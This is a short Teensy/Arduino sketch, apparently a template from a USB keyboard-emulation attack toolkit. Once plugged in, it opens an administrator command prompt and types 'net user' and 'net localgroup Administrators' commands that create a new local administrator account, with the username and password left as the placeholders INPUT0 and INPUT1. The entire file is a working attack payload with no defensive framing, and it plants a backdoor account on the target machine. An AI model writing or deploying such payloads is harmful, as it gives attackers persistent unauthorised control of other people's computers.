#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

# define U_ADD "net user INPUT0 INPUT1 /add"
# define G_ADD "net localgroup Administrators INPUT0 /add"

void setup() { 
 delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
    Keyboard.println(U_ADD);
    delay(2000);
    Keyboard.println(G_ADD);
    delay(1000);
    Keyboard.println("exit");
}

void loop() {

}

DEFS